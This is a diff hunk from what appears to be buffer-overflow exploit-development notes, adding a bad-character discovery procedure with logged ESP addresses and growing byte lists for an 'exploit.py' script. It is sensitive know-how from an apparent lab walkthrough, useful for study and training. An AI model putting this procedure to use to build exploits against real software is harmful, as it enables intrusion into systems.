@@ -121,10 +121,14 @@ python exploit.py
 ```
 
 ```bash
-# ESP   , BADCHARS
-# 010203, "\x00\x??"
-# 010305, "\x00\x??\x??"
-# 020406, "\x00\x??\x??\x??"
+# repeat until Status = Unmodified: start app, exploit, generate a new byte array, compare to ESP
+
+# ESP     , BADCHARS
+# 0188FA30, "\x00\x11"
+# 019CFA30, "\x00\x11\x40"
+# 017FFA30, "\x00\x11\x40\x5f"
+# 01A4FA30, "\x00\x11\x40\x5f\xb8"
+# 0184FA30, "\x00\x11\x40\x5f\xb8\xee"
 
 vim exploit.py # BADCHARS = "\x00\x??\x??\x??\x??"
 ```
